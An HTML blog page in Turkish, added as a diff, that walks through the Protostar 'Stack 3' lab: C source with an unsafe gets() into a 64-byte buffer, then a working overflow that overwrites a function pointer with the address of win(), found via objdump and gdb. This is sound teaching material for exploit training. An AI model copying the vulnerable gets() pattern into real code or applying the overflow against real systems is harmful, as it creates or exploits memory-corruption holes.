@@ -1,0 +1,55 @@
+<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir şey yok"><title>Stack 3 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>Yazılar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>📖 2 dakika</span>
+<a href=..>↪ Protostar</a><h1 class=baslik>Stack 3</h1><main><h1 id=stack3-c>Stack3.c</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>win</span>()
+{
+  printf(<span style=color:#e6db74>&#34;code flow successfully changed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+}
+
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+{
+  <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> (<span style=color:#f92672>*</span>fp)();
+  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];
+
+  fp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+
+  gets(buffer);
+
+  <span style=color:#66d9ef>if</span>(fp) {
+      printf(<span style=color:#e6db74>&#34;calling function pointer, jumping to 0x%08x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, fp);
+      fp();
+  }
+}</code></pre></div><p><strong>Amaç:</strong> main fonksiyonu içerisinde çağırılmayan bir fonksiyonu değişkenin
+değeri değiştirilerek programın akışına manipüle etmek.</p><h1 id=programın-çalıştırılması>Programın Çalıştırılması</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ ./stack3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 64 Tane A
+user@protostar:/opt/protostar/bin$ ./stack3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
+calling function pointer, jumping to 0x43434343
+Segmentation fault</code></pre></div><p>Program çalıştırıldığı zaman kullanıcıdan bir giriş bekliyor. Buffer değişkeni
+64 byte olduğu için 64byte uzunluğunda bir karakter dizesi verererek programı
+incelemeye başlıyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#66d9ef>volatile</span> <span style=color:#a6e22e>int</span> (<span style=color:#f92672>*</span>fp)(); <span style=color:#75715e>/* Fonksiyon Pointerin tanımlanması */</span>
+...
+fp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>/* Fonksiyon adresi olarak 0 atanması */</span></code></pre></div><p>Öncelikle fp fonksiyon pointeri main fonksiyonunda çağırıldığı için fp
+değişkenini istediğimiz fonksiyonun adresi ile değiştirebilirsek programın
+akışını değiştirebiliriz. fp main fonksiyonu içinde lokal değişken olarak
+tanımlandıkğı için stack taşırılarak fp değişkeni değiştirilebilir. fp 4 byte
+olduğu için 4 adet C karakteri ekleyerek fp fonksiyonu çağırıldığında 0 yerine
+<code>0x434343</code> adresindeki kodun çalıştırmasını bekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C>user<span style=color:#960050;background-color:#1e0010>@</span>protostar:<span style=color:#f92672>/</span>opt<span style=color:#f92672>/</span>protostar<span style=color:#f92672>/</span>bin<span style=color:#960050;background-color:#1e0010>$</span> .<span style=color:#f92672>/</span>stack3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
+calling function pointer, jumping to <span style=color:#ae81ff>0x43434343</span>
+Segmentation fault</code></pre></div><p>Ekrana <code>calling function pointer, jumping to 0x43434343</code> yazdırıldığına göre
+programın akışını değiştirdik fakat o adrese erişim yetkimiz olmadığı için
+<code>Segmentation fault</code> hatası aldık. Geriye sadece zıplamak istediğimiz
+fonksiyonun adresini bulmak kaldı.</p><p>Programın dönüş adresini bulabilmek için <code>objdump</code> aracını ve <code>gdb</code> kullanımı
+aşağıdaki gibidir.</p><h1 id=win-fonksiyonunun-adresinin-bulunması>win Fonksiyonunun Adresinin Bulunması</h1><h2 id=objdump>Objdump</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ objdump -S stack3 | grep win
+<span style=color:#ae81ff>08048424</span> &lt;win&gt;:</code></pre></div><h2 id=gdb>GDB</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:/opt/protostar/bin$ gdb ./stack3
+(gdb) p win
+$1 = {void (void)} 0x8048424 &lt;win&gt;
+(gdb) x win
+0x8048424 &lt;win&gt;:        0x83e58955</pre></div><p>Görünüşe göre win fonksiyonunun adresi <code>08048424</code></p><h1 id=programın-akışının-değiştirilmesi>Programın Akışının Değiştirilmesi</h1><p>Programa verdiğim 64 adet &ldquo;A&rdquo; karakteirnin sonuna bu adresi ekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:/opt/protostar/bin$ echo -e &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08&#34; | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed</pre></div><p>Böylelikle stackteki <code>fp</code> değişkenini 0 değerinden <code>08048424</code> değerine döndürüp
+bu adresteki fonksiyonu çalıştırabiliyoruz.</p></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>
